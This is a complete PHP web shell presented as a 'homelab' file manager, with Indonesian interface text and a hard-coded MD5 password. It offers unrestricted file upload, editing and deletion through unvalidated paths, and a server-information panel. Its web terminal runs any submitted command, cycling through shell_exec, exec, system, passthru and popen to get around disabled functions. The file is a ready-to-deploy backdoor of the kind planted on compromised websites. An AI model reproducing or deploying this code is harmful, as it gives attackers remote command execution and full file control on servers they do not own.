<?php
session_start();
$stored_password_hash = md5("J4CKGanzz"); // ganti password
// === LOGIN ===
if (!isset($_SESSION['loggedin'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (md5($_POST['password']) === $stored_password_hash) {
            $_SESSION['loggedin'] = true;
            header("Location: ".$_SERVER['PHP_SELF']);
            exit;
        } else {
            echo "Password salah!";
        }
    }
    echo '<form method="POST">
            <input type="password" name="password" placeholder="Password">
            <input type="submit" value="Login">
          </form>';
    exit;
}
// === LOGOUT ===
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$dir = realpath($dir);
$msg = '';
// === CREATE ===
if (!empty($_FILES['file']['name'])) {
    $target = $dir . "/" . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        $msg = "Upload berhasil!";
    } else {
        $msg = "Upload gagal!";
    }
}
if (isset($_POST['newfolder']) && $_POST['newfolder'] !== '') {
    $newFolder = $dir . DIRECTORY_SEPARATOR . basename($_POST['newfolder']);
    if (!file_exists($newFolder)) {
        mkdir($newFolder);
        $msg = "Folder berhasil dibuat!";
    }
}
// === CREATE FILE (FITUR BARU) ===
if (isset($_POST['newfile']) && $_POST['newfile'] !== '') {
    $newFile = $dir . DIRECTORY_SEPARATOR . basename($_POST['newfile']);
    if (!file_exists($newFile)) {
        if (touch($newFile)) {
            $msg = "File berhasil dibuat!";
        } else {
            $msg = "Gagal membuat file!";
        }
    } else {
        $msg = "File sudah ada!";
    }
}
// === UPDATE ===
if (isset($_POST['rename']) && isset($_POST['oldname'])) {
    $oldPath = $dir . DIRECTORY_SEPARATOR . $_POST['oldname'];
    $newPath = $dir . DIRECTORY_SEPARATOR . $_POST['rename'];
    if (rename($oldPath, $newPath)) {
        $msg = "Rename sukses!";
    } else {
        $msg = "Rename gagal!";
    }
}
if (isset($_POST['editfile']) && isset($_POST['filename'])) {
    $filePath = $dir . DIRECTORY_SEPARATOR . $_POST['filename'];
    file_put_contents($filePath, $_POST['editfile']);
    $msg = "File berhasil diupdate!";
}
// === DELETE ===
if (isset($_POST['delete'])) {
    $target = $dir . DIRECTORY_SEPARATOR . $_POST['delete'];
    if (is_dir($target)) {
        if (rmdir($target)) {
            $msg = "Folder dihapus!";
        } else {
            $msg = "Gagal hapus folder!";
        }
    } else {
        if (unlink($target)) {
            $msg = "File dihapus!";
        } else {
            $msg = "Gagal hapus file!";
        }
    }
}
// === TERMINAL HELPERS ===
function exec_cmd($cmd, $cwd) {
    $disabled = explode(',', str_replace(' ', '', ini_get('disable_functions')));
    $output = "";
    // Build command sesuai OS
    if (strncasecmp(PHP_OS, 'WIN', 3) == 0) {
        $fullCmd = "cd /d " . escapeshellarg($cwd) . " && cmd /c " . $cmd . " 2>&1";
    } else {
        $fullCmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
    }
    // shell_exec
    if (!in_array('shell_exec', $disabled) && function_exists('shell_exec')) {
        $output = shell_exec($fullCmd);
        if ($output !== null) return $output;
    }
    // exec
    if (!in_array('exec', $disabled) && function_exists('exec')) {
        $res = array();
        exec($fullCmd, $res);
        return implode("\n", $res);
    }
    // system
    if (!in_array('system', $disabled) && function_exists('system')) {
        ob_start();
        system($fullCmd);
        return ob_get_clean();
    }
    // passthru
    if (!in_array('passthru', $disabled) && function_exists('passthru')) {
        ob_start();
        passthru($fullCmd);
        return ob_get_clean();
    }
    // popen
    if (!in_array('popen', $disabled) && function_exists('popen')) {
        $handle = popen($fullCmd, 'r');
        $res = '';
        while (!feof($handle)) {
            $res .= fgets($handle);
        }
        pclose($handle);
        return $res;
    }
    return "Tidak ada fungsi eksekusi yang tersedia (semua disable).";
}
$terminal_output = "";
if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    $terminal_output = exec_cmd($cmd, $dir);
}
// cek disable functions utk ditampilkan
$disabled_funcs = ini_get("disable_functions");
if (!$disabled_funcs) {
    $disabled_funcs = "None";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager Homelab</title>
    <style>
        body { font-family: Arial, sans-serif; background:#f4f4f4; color:#333; margin:20px; }
        h2 { margin-bottom:10px; }
        a { color:#007bff; text-decoration:none; }
        a:hover { text-decoration:underline; }
        .logout { background:#dc3545; color:white; padding:6px 12px; border-radius:4px; text-decoration:none; }
        .logout:hover { background:#c82333; }
        .message { padding:8px; margin-bottom:10px; border-radius:4px; background:#e2e3e5; }
        table { width:100%; border-collapse:collapse; margin-top:10px; background:white; }
        th, td { padding:8px 12px; border-bottom:1px solid #ddd; }
        th { background:#f1f1f1; text-align:left; }
        tr:hover { background:#f9f9f9; }
        form.inline { display:inline; margin:0; }
        textarea { width:100%; height:400px; font-family:monospace; }
        input[type=text], input[type=file] { padding:6px; border:1px solid #ccc; border-radius:4px; }
        input[type=submit] { padding:6px 12px; margin:2px; border:none; border-radius:4px; background:#28a745; color:white; cursor:pointer; }
        input[type=submit]:hover { background:#218838; }
        .danger { background:#dc3545 !important; }
        .danger:hover { background:#c82333 !important; }
        .server-info { background:white; padding:10px; border:1px solid #ddd; margin-bottom:15px; }
        .terminal { background:#111; color:#0f0; padding:10px; border-radius:5px; margin-top:20px; }
        .terminal pre { white-space:pre-wrap; }
        .terminal input[type=text] { width:80%; background:#222; color:#0f0; border:1px solid #444; padding:6px; }
        .terminal input[type=submit] { background:#555; color:#fff; border:none; padding:6px 12px; margin-left:5px; }
        .terminal input[type=submit]:hover { background:#777; }
    </style>
</head>
<body>
<div class="topbar">
    <h2>File Manager - <?php echo htmlspecialchars($dir); ?></h2>
    <a class="logout" href="?logout=1">Logout</a>
</div>
<!-- Server Info -->
<div class="server-info">
    <b>Server Information:</b><br>
    OS: <?php echo php_uname(); ?> <br>
    PHP Version: <?php echo phpversion(); ?> <br>
    Server Software: <?php echo isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'CLI'; ?> <br>
    User: <?php echo get_current_user(); ?> <br>
    Document Root: <?php echo isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : getcwd(); ?> <br>
    Current Dir: <?php echo $dir; ?> <br>
    Disabled Functions: <?php echo $disabled_funcs; ?> <br>
</div>
<?php if (!empty($msg)): ?>
    <div class="message"><?php echo $msg; ?></div>
<?php endif; ?>
<!-- Navigasi manual -->
<form method="GET">
    <input type="text" name="dir" value="<?php echo htmlspecialchars($dir); ?>" size="60">
    <input type="submit" value="Go">
</form><br>
<!-- Upload & Buat Folder -->
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
<form method="POST">
    <input type="text" name="newfolder" placeholder="Nama Folder Baru">
    <input type="submit" value="Buat Folder">
</form>
<!-- FITUR BARU: Create File -->
<form method="POST">
    <input type="text" name="newfile" placeholder="Nama File Baru">
    <input type="submit" value="Buat File">
</form>
<hr>
<!-- List isi folder -->
<?php
if (is_dir($dir)) {
    $files = scandir($dir);
    echo "<table>";
    echo "<tr><th>Nama</th><th>Tipe</th><th>Size</th><th>Aksi</th></tr>";
    foreach ($files as $f) {
        if ($f === '.') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $f;echo "<tr>";
        if ($f === '..') {
            $parent = dirname($dir);
            echo "<td><a href='?dir=".urlencode($parent)."'>[..]</a></td><td>Parent</td><td>-</td><td>-</td>";
        } elseif (is_dir($path)) {
            echo "<td><a href='?dir=".urlencode($path)."'>".$f."</a></td><td>Folder</td><td>-</td>";
            echo "<td>
                <form class='inline' method='POST'><input type='hidden' name='delete' value='".$f."'><input class='danger' type='submit' value='Delete'></form>
                <form class='inline' method='POST'><input type='hidden' name='oldname' value='".$f."'><input type='text' name='rename' placeholder='Rename'><input type='submit' value='OK'></form>
            </td>";
        } else {
            echo "<td><a href='?dir=".urlencode($dir)."&view=".urlencode($f)."'>".$f."</a></td><td>File</td><td>".filesize($path)." bytes</td>";
            echo "<td>
                <form class='inline' method='POST'><input type='hidden' name='delete' value='".$f."'><input class='danger' type='submit' value='Delete'></form>
                <form class='inline' method='POST'><input type='hidden' name='oldname' value='".$f."'><input type='text' name='rename' placeholder='Rename'><input type='submit' value='OK'></form>
                <a href='?dir=".urlencode($dir)."&edit=".urlencode($f)."'>Edit</a>
            </td>";
        }
        echo "</tr>";
    }
    echo "</table>";
}
// READ / EDIT file
if (isset($_GET['view'])) {
    $file = $dir . DIRECTORY_SEPARATOR . $_GET['view'];
    if (is_file($file)) {
        echo "<h3>Isi File: ".htmlspecialchars($_GET['view'])."</h3>";
        echo "<pre>".htmlspecialchars(file_get_contents($file))."</pre>";
    }
}
if (isset($_GET['edit'])) {
    $file = $dir . DIRECTORY_SEPARATOR . $_GET['edit'];
    if (is_file($file)) {
        $content = htmlspecialchars(file_get_contents($file));
        echo "<h3>Edit File: ".htmlspecialchars($_GET['edit'])."</h3>";
        echo "<form method='POST'>
                <textarea name='editfile'>".$content."</textarea><br>
                <input type='hidden' name='filename' value='".htmlspecialchars($_GET['edit'])."'>
                <input type='submit' value='Save'>
              </form>";
    }
}
?>
<!-- Terminal -->
<div class="terminal">
    <h3>Web Terminal (Homelab only)</h3>
    <form method="POST">
        <input type="text" name="cmd" placeholder="Command..." autofocus>
        <input type="submit" value="Run">
    </form>
    <pre><?php echo htmlspecialchars($terminal_output); ?></pre>
</div>
</body>
</html>